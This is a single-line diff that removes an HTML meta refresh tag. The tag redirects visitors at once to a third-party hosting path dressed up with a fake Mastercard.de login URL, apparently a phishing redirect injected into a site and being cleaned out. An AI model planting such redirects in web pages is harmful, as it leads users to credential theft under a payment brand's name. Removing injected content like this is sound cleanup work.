@@ -1,1 +1,0 @@
-<meta http-equiv="refresh" content="0;url= http://www.stell-hosting.com/templates/Ups////#URL=http://Mastercard.de/home___mastercard.de.ASPX/auth_user/bin/authNuser.cgi?date=1343227429&skey=5d1ea14af64ab6e1e9480756fb7047d2">
